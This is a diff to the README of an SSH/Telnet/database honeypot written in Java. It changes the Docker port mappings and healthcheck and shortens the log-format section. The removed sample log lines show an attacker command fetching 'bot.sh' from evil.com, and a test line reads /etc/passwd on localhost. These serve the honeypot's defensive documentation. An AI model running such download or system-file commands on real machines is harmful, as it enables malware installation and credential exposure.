@@ -131,15 +131,24 @@ services:
     container_name: ssh-honeypot-j
     restart: always
     volumes:
-      - ${PWD}/logs:/app/logs
-      - ${PWD}/db:/app/db
+      - ${PWD}/logs:/app/logs  # 挂载宿主机日志目录
+      - ${PWD}/db:/app/db      # 挂载宿主机数据库目录
     environment:
-      - TZ=Asia/Shanghai
+      - TZ=Asia/Shanghai       # 时区，北京时间
     ports:
-      - 2222:2222
-      - 2323:2323
-      - 8080:8080   # Web 控制台，按需开放
-    mem_limit: 512m
+      - 22:2222                # SSH端口
+      - 23:2323                # Telnet端口
+      - 3306:3306              # MySQL数据库端口
+      - 5432:5432              # Postgre数据库端口
+      - 6379:6379              # Redis数据库端口
+      - 127.0.0.1:11800:8080   # Web控制台端口，建议使用nginx代理为https
+    mem_limit: 512m            # 内存限制，被持续攻击大约需要290MB
+    healthcheck:
+      test: ["CMD", "curl", "-f", "http://127.0.0.1:8080"]
+      interval: 10s
+      timeout: 3s
+      retries: 3
+      start_period: 20s
 ```
 
 启动：
@@ -150,10 +159,10 @@ docker compose up -d
 ```
 
 - `${PWD}/logs` 为宿主机日志目录，攻击日志实时写入 `./logs/honeypot.jsonl`
-- `${PWD}/db` 持久化 SQLite 数据库（攻击日志与系统用户），重建容器不丢数据
+- `${PWD}/db` 持久化 SQLite 数据库（攻击日志与系统用户），重建容器不丢数据。还可以自己更新IP库，文件名：ip2region_v4.xdb、ip2region_v6.xdb，下载地址：https://github.com/lionsoul2014/ip2region
 - `mem_limit: 512m` 限制容器内存，避免海量会话拖垮宿主机
 - 蜜罐服务端口（3306/5432/6379）同样在容器内监听，需要诱捕数据库端口时自行追加映射
-- 如需自定义配置，可将 `config.yaml` 一并挂载：
+- 如需自定义配置，可将 `config.yaml` 一并挂载，如：`${PWD}/config.yaml:/app/config.yaml`
 
   ```yaml
   volumes:
@@ -165,53 +174,15 @@ docker compose up -d
 ## 测试
 
 ```bash
-ssh -p 2222 root@127.0.0.1        # 任意密码可登录
-telnet 127.0.0.1 2323             # 任意账号密码可登录
+ssh -p 2222 root@127.0.0.1
+telnet 127.0.0.1 2323
 ssh -p 2222 root@127.0.0.1 "uname -a; cat /etc/passwd"
 ```
 
 ## 日志格式
 
-每行一个 JSON 事件：
-
-```json
-{"ts":"2026-08-11 15:40:01.123","event":"auth_attempt","session":"s1-...","protocol":"ssh","src_ip":"1.2.3.4","username":"root","password":"123456","success":"true"}
-{"ts":"2026-08-11 15:40:05.456","event":"command","session":"s1-...","src_ip":"1.2.3.4","username":"root","command":"wget http://evil.com/bot.sh"}
-{"ts":"2026-08-11 15:40:05.789","event":"download","session":"s1-...","src_ip":"1.2.3.4","username":"root","url":"http://evil.com/bot.sh"}
-```
-
-事件类型：`session_open` / `auth_attempt` / `command` / `download` / `session_close`
-
-## 项目结构
-
-```
-docs                                     # 系统文档
-src/main/java/com/honeypot/
-├── Main.java                         # 入口：加载配置、启动服务、优雅关闭
-├── config/HoneypotConfig.java        # YAML 配置加载（默认 config.yaml）
-├── fs/
-│   ├── VNode.java                   # 虚拟文件节点
-│   └── VirtualFileSystem.java       # 内存文件系统（伪装 Ubuntu）
-├── shell/
-│   ├── FakeShell.java               # 交互式行编辑 + REPL（SSH/Telnet 共用）
-│   ├── CommandProcessor.java        # 命令解释器（40+ 命令）
-│   └── SessionState.java            # 会话状态（用户/目录/历史）
-├── ssh/SshHoneypotServer.java        # SSH 服务（MINA SSHD）
-├── telnet/TelnetHoneypotServer.java  # Telnet 服务（原生 Socket）
-├── mysql|postgres|redis/...          # 数据库协议蜜罐（连接即记录并拒绝）
-├── auth/CredentialGuard.java         # 蜜罐登录密码本校验与 IP 锁定
-├── log/
-│   ├── AttackLogger.java            # JSONL 攻击日志（单线程异步写）
-│   └── SqliteLogStore.java          # SQLite 结构化存储（与 JSONL 双写）
-└── web/                              # Web 可视化控制台（Javalin 内嵌）
-    ├── WebServer.java               # 服务器启动/静态资源/登录守卫
-    ├── ApiController.java           # REST API（统计/明细/用户管理）
-    ├── AuthService.java             # 登录校验与会话管理
-    ├── LogRepository.java           # 攻击日志查询（只读连接）
-    └── UserRepository.java          # 系统用户与 PBKDF2 口令
-src/main/resources/web/               # 前端静态页（登录页/主界面 SPA，随 jar 打包）
-config.yaml                              # 系统配置信息
-```
+- 每行一个 JSON 事件
+- 同步保存到数据库（WAL 模式，攻击事件在 JSONL 之外同步写入 `db/database.db`）
 
 ## 支持诱捕清单
 - [X] SSH
